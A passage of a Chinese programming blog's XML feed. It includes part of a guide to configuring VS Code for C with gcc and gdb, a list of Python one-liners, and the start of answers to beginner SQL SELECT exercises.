class="line">            <span class="attr">"preLaunchTask"</span>: <span class="string">"Compile"</span>, <span class="comment">// 调试会话开始前要运行的任务。</span></span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"cppdbg"</span>, <span class="comment">// 设置要使用的基础调试器。使用 GDB 或 LLDB 时必须是 cppdbg 。</span></span><br><span class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>, <span class="comment">// 设置启动程序还是附加到已经运行的实例。启动或附加 ( launch | attach ).</span></span><br><span class="line">            <span class="attr">"program"</span>: <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>, <span class="comment">// 调试器将启动或附加的可执行文件的完整路径。</span></span><br><span class="line">            <span class="attr">"externalConsole"</span>: <span class="literal">false</span>, <span class="comment">// 设置是否显示外部控制台。</span></span><br><span class="line">            <span class="attr">"logging"</span>: &#123; <span class="comment">// 用于确定应该将哪些类型的消息记录到调试控制台。</span></span><br><span class="line">                <span class="attr">"exceptions"</span>: <span class="literal">true</span>, <span class="comment">// 是否应将异常消息记录到调试控制台。默认为真。</span></span><br><span class="line">                <span class="attr">"moduleLoad"</span>: <span class="literal">false</span>, <span class="comment">// 是否应将模块加载事件记录到调试控制台。默认为真。</span></span><br><span class="line">                <span class="attr">"programOutput"</span>: <span class="literal">true</span>, <span class="comment">// 是否应将程序输出记录到调试控制台的可选标志。默认为真。</span></span><br><span class="line">                <span class="attr">"engineLogging"</span>: <span class="literal">false</span>, <span class="comment">// 是否应将诊断引擎日志记录到调试控制台。默认为假。</span></span><br><span class="line">                <span class="attr">"trace"</span>: <span class="literal">false</span>, <span class="comment">// 是否将诊断适配器命令跟踪记录到调试控制台。默认为假。</span></span><br><span class="line">                <span class="attr">"traceResponse"</span>: <span class="literal">false</span> <span class="comment">// 是否将诊断适配器命令和响应跟踪记录到调试控制台。默认为假。</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 配置目标应用程序：</span></span><br><span class="line">            <span class="attr">"args"</span>: [], <span class="comment">// 设置调试时传递给程序的命令行参数。</span></span><br><span class="line">            <span class="attr">"cwd"</span>: <span class="string">"$&#123;workspaceFolder&#125;"</span>, <span class="comment">// 设置调试器启动的应用程序的工作目录。</span></span><br><span class="line">            <span class="attr">"environment"</span>: [], <span class="comment">// 设置调试时添加到程序环境中的环境变量，例如: [ &#123; "name": "squid", "value": "clam" &#125; ]。</span></span><br><span class="line">            <span class="comment">// 自定义 GDB 或者 LLDB：</span></span><br><span class="line">            <span class="attr">"windows"</span>: &#123;</span><br><span class="line">                <span class="attr">"MIMode"</span>: <span class="string">"gdb"</span>, <span class="comment">// 指定 VS Code 连接的调试器，必须为 gdb 或者 lldb。</span></span><br><span class="line">                <span class="attr">"miDebuggerPath"</span>: <span class="string">"D:\\mingw64\\bin\\gdb.exe"</span> <span class="comment">// 调试器的路径，修改为你的安装路径</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"miDebuggerArgs"</span>: <span class="string">""</span>, <span class="comment">// 传递给调试器的附加参数</span></span><br><span class="line">            <span class="attr">"stopAtEntry"</span>: <span class="literal">false</span>, <span class="comment">// 设置调试器是否停止在目标的入口（附加时忽略）。默认值为 false。</span></span><br><span class="line">            <span class="attr">"setupCommands"</span>: [</span><br><span class="line">                &#123; <span class="comment">// 执行下面的命令数组以设置 GDB 或 LLDB</span></span><br><span class="line">                    <span class="attr">"description"</span>: <span class="string">"Enable pretty-printing for gdb"</span>,</span><br><span class="line">                    <span class="attr">"text"</span>: <span class="string">"-enable-pretty-printing"</span>, <span class="comment">// 鼠标悬停查看变量的值，需要启用 pretty-printing 。</span></span><br><span class="line">                    <span class="attr">"ignoreFailures"</span>: <span class="literal">true</span> <span class="comment">// 忽略失败的命令，默认为 false 。</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>留意</strong> <code>luanch.json</code> <strong>中注释内容</strong>，记得把 “miDebuggerPath” 参数修改成你自己安装位置里的 <code>gdb.exe</code></p><p><code>gdb.exe</code> 位于 <code>{MinGW-w64安装位置}\mingw64\bin</code> 下面。</p><p>==注意!!!==</p><p><code>&quot;externalConsole&quot;: false, // 设置是否显示外部控制台。</code></p><p>这段配置,我在网上搜索的时候,无一例外都是改成true的</p><p>true—-&gt;像是在dev啊,vs啊之类的,会弹出一个黑色的框,用来互交,输出</p><p>false—-&gt;在终端中显示出来</p><p>本来我也是改成true的,但是弹框总是会闪退,查了很久所有解决办法都试过了,但是没法解决,能力有限</p><p>所以就改成false了,意外的好用.互交,输出都在终端中进行,如下图</p><p><img src="Snipaste_2020-03-02_13-19-52.png" alt="Snipaste_2020-03-02_13-19-52"></p><h2 id="6-配置调试前执行的任务-task-json"><a href="#6-配置调试前执行的任务-task-json" class="headerlink" title="6. 配置调试前执行的任务 task.json"></a>6. 配置调试前执行的任务 task.json</h2><p>再按一次 <code>F5</code> ，会弹出“找不到任务”的提示窗口，点击 <code>配置任务</code> 按钮，如下图所示：</p><p><img src="2018-06-01_12-44-05.png" alt="2018-06-01_12-44-05"></p><p>然后在弹出的命令面板选择 <code>使用模板创建 task.json 文件</code> ，如下图所示：</p><p><img src="2018-06-01_12-44-06.png" alt="2018-06-01_12-44-06"></p><p>继续选择 <code>Others 运行任意外部命令的示例</code> ，如下图所示：</p><p><img src="2018-06-01_12-44-07.png" alt="2018-06-01_12-44-07"></p><p>完成以上步骤之后，会在工作区的 <code>.vscode</code> 目录下生成 <code>tasks.json</code> 文件，并自动打开 <code>task.json</code> 文件。</p><p><img src="2018-06-01_12-44-08.png" alt="2018-06-01_12-44-08"></p><p>接下来我们将 <code>task.json</code> 文件内容清空，复制下面的内容到文件中并保存：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 有关 tasks.json 格式的参考文档：https://go.microsoft.com/fwlink/?LinkId=733558 。</span></span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"2.0.0"</span>,</span><br><span class="line">    <span class="attr">"tasks"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"Compile"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"windows"</span>: &#123;</span><br><span class="line">                <span class="attr">"command"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">                <span class="attr">"args"</span>: [</span><br><span class="line">                    <span class="string">"-g"</span>,</span><br><span class="line">                    <span class="string">"\"$&#123;file&#125;\""</span>,</span><br><span class="line">                    <span class="string">"-o"</span>,</span><br><span class="line">                    <span class="string">"\"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe\""</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"group"</span>: &#123;</span><br><span class="line">                <span class="attr">"kind"</span>: <span class="string">"build"</span>,</span><br><span class="line">                <span class="attr">"isDefault"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"presentation"</span>: &#123;</span><br><span class="line">                <span class="attr">"reveal"</span>: <span class="string">"silent"</span>,</span><br><span class="line">                <span class="attr">"focus"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"echo"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"panel"</span>: <span class="string">"dedicated"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: &#123;</span><br><span class="line">                <span class="attr">"owner"</span>: <span class="string">"cpp"</span>,</span><br><span class="line">                <span class="attr">"fileLocation"</span>: [</span><br><span class="line">                    <span class="string">"relative"</span>,</span><br><span class="line">                    <span class="string">"$&#123;workspaceFolder&#125;"</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"pattern"</span>: &#123;</span><br><span class="line">                    <span class="attr">"regexp"</span>: <span class="string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span>,</span><br><span class="line">                    <span class="attr">"file"</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="attr">"line"</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">"column"</span>: <span class="number">3</span>,</span><br><span class="line">                    <span class="attr">"severity"</span>: <span class="number">4</span>,</span><br><span class="line">                    <span class="attr">"message"</span>: <span class="number">5</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc.exe build active file"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"D:\\mingw64\\bin\\gcc.exe"</span>,</span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"options"</span>: &#123;</span><br><span class="line">                <span class="attr">"cwd"</span>: <span class="string">"D:\\mingw64\\bin"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: [</span><br><span class="line">                <span class="string">"$gcc"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"group"</span>: <span class="string">"build"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-ojbk"><a href="#7-ojbk" class="headerlink" title="7. ojbk"></a>7. ojbk</h2><p>回到hello.c,重新按下F5,yeah!!!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vscode配置c&quot;&gt;&lt;a href=&quot;#vscode配置c&quot; class=&quot;headerlink&quot; title=&quot;vscode配置c&quot;&gt;&lt;/a&gt;vscode配置c&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="vscode" scheme="https://mercer5.github.io/categories/vscode/"/>
    
    
      <category term="vscode" scheme="https://mercer5.github.io/tags/vscode/"/>
    
      <category term="c" scheme="https://mercer5.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>python-一行代码</title>
    <link href="https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/"/>
    <id>https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/</id>
    <published>2020-02-13T12:39:45.000Z</published>
    <updated>2020-08-24T15:30:09.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一行代码python"><a href="#一行代码python" class="headerlink" title="一行代码python"></a>一行代码python</h1><h2 id="1-100-的和"><a href="#1-100-的和" class="headerlink" title="1 - 100 的和"></a>1 - 100 的和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum(range(<span class="number">1</span>,<span class="number">101</span>))</span><br></pre></td></tr></table></figure><h2 id="数值交换"><a href="#数值交换" class="headerlink" title="数值交换"></a>数值交换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,b=b,a</span><br></pre></td></tr></table></figure><h2 id="奇偶数"><a href="#奇偶数" class="headerlink" title="奇偶数"></a>奇偶数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="comment">#[0, 2, 4, 6, 8]</span></span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">1</span>]</span><br><span class="line"><span class="comment">#[1, 3, 5, 7, 9]</span></span><br></pre></td></tr></table></figure><h2 id="展开列表"><a href="#展开列表" class="headerlink" title="展开列表"></a>展开列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">[x <span class="keyword">for</span> y <span class="keyword">in</span> lst <span class="keyword">for</span> x <span class="keyword">in</span> y]</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h2 id="打乱列表"><a href="#打乱列表" class="headerlink" title="打乱列表"></a>打乱列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">lst=list(range(<span class="number">10</span>))</span><br><span class="line">random.shuffle(lst)</span><br><span class="line">lst</span><br></pre></td></tr></table></figure><h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"asdfghjkl"</span></span><br><span class="line">s[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#'lkjhgfdsa'</span></span><br></pre></td></tr></table></figure><h2 id="查看目录下所有文件"><a href="#查看目录下所有文件" class="headerlink" title="查看目录下所有文件"></a><strong>查看目录下所有文件</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir()</span><br></pre></td></tr></table></figure><h2 id="去除字符串间的空格"><a href="#去除字符串间的空格" class="headerlink" title="去除字符串间的空格"></a><strong>去除字符串间的空格</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line">s.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line"><span class="string">""</span>.join(s.split())</span><br></pre></td></tr></table></figure><h2 id="字符串整数列表变成整数列表"><a href="#字符串整数列表变成整数列表" class="headerlink" title="字符串整数列表变成整数列表"></a><strong>字符串整数列表变成整数列表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>]</span><br><span class="line">list(map(<span class="keyword">lambda</span> x: int(x),a))</span><br><span class="line"><span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure><h2 id="删除列表中重复的值"><a href="#删除列表中重复的值" class="headerlink" title="删除列表中重复的值"></a><strong>删除列表中重复的值</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">list(set(lst))</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h2 id="9-9-乘法表"><a href="#9-9-乘法表" class="headerlink" title="9 * 9 乘法表"></a><strong>9 * 9 乘法表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'\n'</span>.join([<span class="string">'\t'</span>.join([<span class="string">"%2s*%2s=%2s"</span>%(j,i,i*j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)]))</span><br></pre></td></tr></table></figure><h2 id="两个列表中相同的元素"><a href="#两个列表中相同的元素" class="headerlink" title="两个列表中相同的元素"></a>两个列表中相同的元素</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)&amp;set(b)</span><br><span class="line"><span class="comment">#&#123;3, 4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="两个列表中不同的元素"><a href="#两个列表中不同的元素" class="headerlink" title="两个列表中不同的元素"></a><strong>两个列表中不同的元素</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)^set(b)</span><br><span class="line"><span class="comment">#&#123;1, 2, 5, 6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="合并两个字典"><a href="#合并两个字典" class="headerlink" title="合并两个字典"></a><strong>合并两个字典</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>&#125;</span><br><span class="line">b=&#123;<span class="string">"age"</span>:<span class="string">"100"</span>&#125;</span><br><span class="line">a.update(b)</span><br><span class="line">a</span><br><span class="line"><span class="comment">#&#123;'name': 'mercer', 'age': '100'&#125;</span></span><br></pre></td></tr></table></figure><h2 id="字典键从小到大排序"><a href="#字典键从小到大排序" class="headerlink" title="字典键从小到大排序"></a><strong>字典键从小到大排序</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"like"</span>:<span class="string">"python"</span>&#125;</span><br><span class="line">sorted(a.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#[('age', 100), ('like', 'python'), ('name', 'mercer')]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一行代码python&quot;&gt;&lt;a href=&quot;#一行代码python&quot; class=&quot;headerlink&quot; title=&quot;一行代码python&quot;&gt;&lt;/a&gt;一行代码python&lt;/h1&gt;&lt;h2 id=&quot;1-100-的和&quot;&gt;&lt;a href=&quot;#1-100-的和&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sql-wp</title>
    <link href="https://mercer5.github.io/2020/02/13/sql-wp/"/>
    <id>https://mercer5.github.io/2020/02/13/sql-wp/</id>
    <published>2020-02-13T12:39:04.000Z</published>
    <updated>2020-08-24T15:30:09.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql-wp"><a href="#sql-wp" class="headerlink" title="sql wp"></a>sql wp</h1><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><p><a href="http://xuesql.cn/" target="_blank" rel="noopener">http://xuesql.cn/</a></p><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><p>服务SELECT查询语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> condition(s)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">ASC</span>/<span class="keyword">DESC</span> </span><br><span class="line"><span class="keyword">LIMIT</span> num_limit <span class="keyword">OFFSET</span> num_offset;</span><br></pre></td></tr></table></figure><p>用INNER JOIN 连接表的语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_table_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable （主表） </span><br><span class="line"><span class="keyword">INNER</span>/<span class="keyword">LEFT</span>/<span class="keyword">RIGHT</span>/<span class="keyword">FULL</span> <span class="keyword">JOIN</span> another_table （要连接的表）    </span><br><span class="line"><span class="keyword">ON</span> mytable.id = another_table.id (主键连接，两个相同的连成<span class="number">1</span>条) </span><br><span class="line"><span class="keyword">WHERE</span> condition(s) </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span>, … <span class="keyword">ASC</span>/<span class="keyword">DESC</span> </span><br><span class="line"><span class="keyword">LIMIT</span> num_limit <span class="keyword">OFFSET</span> num_offset;</span><br></pre></td></tr></table></figure><p>在查询条件中处理 NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IS</span>/<span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line"><span class="keyword">AND</span>/<span class="keyword">OR</span> another_condition </span><br><span class="line"><span class="keyword">AND</span>/<span class="keyword">OR</span> …;</span><br></pre></td></tr></table></figure><p>属性列和表取别名的例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span> <span class="keyword">AS</span> better_column_name, … </span><br><span class="line"><span class="keyword">FROM</span> a_long_widgets_table_name <span class="keyword">AS</span> mywidgets </span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> widget_sales</span><br><span class="line"><span class="keyword">ON</span> mywidgets.id = widget_sales.widget_id;</span><br></pre></td></tr></table></figure><p>对全部结果数据做统计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> AGG_FUNC(\column_or_expression\) <span class="keyword">AS</span> aggregate_description, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression;</span><br></pre></td></tr></table></figure><p>用分组的方式统计</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先对数据做WHERE，后对结果做分组</span><br><span class="line"><span class="keyword">SELECT</span> AGG_FUNC(column_or_expression) <span class="keyword">AS</span> aggregate_description, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody><tr><td>COUNT(*****), COUNT(column)</td><td>计数！COUNT(*) 统计数据行数，COUNT(column) 统计column非NULL的行数.</td></tr><tr><td>MIN(column)</td><td>找column最小的一行.</td></tr><tr><td>MAX(column)</td><td>找column最大的一行.</td></tr><tr><td>AVG(column)</td><td>对column所有行取平均值.</td></tr><tr><td>SUM(column)</td><td>对column所有行求和.</td></tr></tbody></table><p>用HAVING进行筛选</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以对分组之后的数据再做<span class="keyword">SELECT</span>筛选</span><br><span class="line"><span class="keyword">SELECT</span> group_by_column, AGG_FUNC(column_expression) <span class="keyword">AS</span> aggregate_result_alias, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> condition </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">HAVING</span> \group_condition\;</span><br></pre></td></tr></table></figure><p>完整的SELECT查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="keyword">column</span>, AGG_FUNC(column_or_expression), … </span><br><span class="line"><span class="keyword">FROM</span> mytable    </span><br><span class="line"><span class="keyword">JOIN</span> another_table      </span><br><span class="line"><span class="keyword">ON</span> mytable.column = another_table.column    </span><br><span class="line"><span class="keyword">WHERE</span> constraint_expression   </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">column</span>    </span><br><span class="line"><span class="keyword">HAVING</span> constraint_expression    </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">ASC</span>/<span class="keyword">DESC</span>    </span><br><span class="line"><span class="keyword">LIMIT</span> <span class="keyword">count</span> <span class="keyword">OFFSET</span> <span class="keyword">COUNT</span>;</span><br></pre></td></tr></table></figure><h2 id="lesson-0"><a href="#lesson-0" class="headerlink" title="lesson 0"></a>lesson 0</h2><p>照着抄就行了</p><h2 id="lesson-1-select"><a href="#lesson-1-select" class="headerlink" title="lesson 1 select"></a>lesson 1 select</h2><ol><li><p>找到所有电影的名称<code>title</code></p><p><code>SELECT title FROM movies;</code></p></li><li><p>找到所有电影的导演</p><p><code>SELECT director FROM movies;</code></p></li><li><p>找到所有电影的名称和导演</p><p><code>SELECT title,director FROM movies;</code></p></li><li><p>找到所有电影的名称和上映年份</p><p><code>SELECT title,year FROM movies;</code></p></li><li><p>找到所有电影的所有信息</p><p><code>SELECT * FROM movies;</code></p></li><li><p>找到所有电影的名称,Id和播放时长</p><p><code>SELECT title,id,length_minutes FROM movies;</code></p></li><li><p>请列出所有电影的ID,名称和出版国(即美国)</p><p><code>SELECT title,id,&#39;美国&#39; as country FROM movies;</code></p></li></ol><h2 id="lesson-2-condition"><a href="#lesson-2-condition" class="headerlink" 